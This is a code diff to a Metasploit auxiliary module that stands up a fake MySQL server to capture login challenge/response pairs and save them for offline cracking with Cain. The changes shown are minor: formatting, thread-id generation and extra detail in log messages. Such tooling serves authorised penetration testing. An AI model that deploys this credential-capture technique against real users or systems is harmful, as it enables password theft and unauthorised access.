@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -25,7 +21,7 @@ class Metasploit3 < Msf::Auxiliary
 				capture authentication credentials. It captures	challenge and
 				response pairs that can be supplied to Cain for	cracking.
 			},
-			'Author'         => 'Patrik Karlsson patrik[at]cqure.net',
+			'Author'         => 'Patrik Karlsson <patrik[at]cqure.net>',
 			'License'        => MSF_LICENSE,
 			'Actions'        => [ [ 'Capture' ] ],
 			'PassiveActions' => [ 'Capture' ],
@@ -36,7 +32,7 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				OptPort.new('SRVPORT', [ true, "The local port to listen on.", 3306 ]),
 				OptString.new('CHALLENGE', [ true, "The 16 byte challenge", "112233445566778899AABBCCDDEEFF1122334455" ]),
-				OptString.new("SRVVERSION", [ true, "The server version to report in the greeting response", "5.5.16" ]),
+				OptString.new('SRVVERSION', [ true, "The server version to report in the greeting response", "5.5.16" ]),
 				OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
 			], self.class)
 	end
@@ -76,7 +72,7 @@ class Metasploit3 < Msf::Auxiliary
 			( length & 0x00FFFFFF ) + ( packetno << 24 ), # length + packet no
 			10, # protocol version: 10e
 			@version, # server version: 5.5.16 (unless changed)
-			rand(1..10000), # thread id
+			rand(9999) + 1, # thread id
 			chall.slice!(0,8), # the first 8 bytes of the challenge
 			0x00, # filler
 			0xfff7, # server capabilities
@@ -140,13 +136,13 @@ class Metasploit3 < Msf::Auxiliary
 
 		mysql_process_login(data, info)
 		if info[:errors] and not info[:errors].empty?
-			print_error("#{info[:errors].join("\n")}")
+			print_error("#{@state[c][:name]} #{info[:errors].join("\n")}")
 		elsif info[:username] and info[:response]
 			mysql_send_error(c, "Access denied for user '#{info[:username]}'@'#{c.peerhost}' (using password: YES)")
 			if info[:database]
-				print_status("MYSQL LOGIN: User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}; Database: #{info[:database]}")
+				print_status("MYSQL LOGIN: #{@state[c][:name]}; User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}; Database: #{info[:database]}")
 			else
-				print_status("MYSQL LOGIN: User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}")
+				print_status("MYSQL LOGIN: #{@state[c][:name]}; User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}")
 			end
 			hash_line = "#{info[:username]}:$mysql$#{@challenge.unpack("H*")[0]}$#{info[:response].unpack('H*')[0]}"
 			report_auth_info(
@@ -162,7 +158,7 @@ class Metasploit3 < Msf::Auxiliary
 			)
 
 			if (datastore['CAINPWFILE'])
-				fd = File.open(datastore['CAINPWFILE'], "ab")
+				fd = ::File.open(datastore['CAINPWFILE'], "ab")
 				fd.puts(
 				[
 					info[:username],
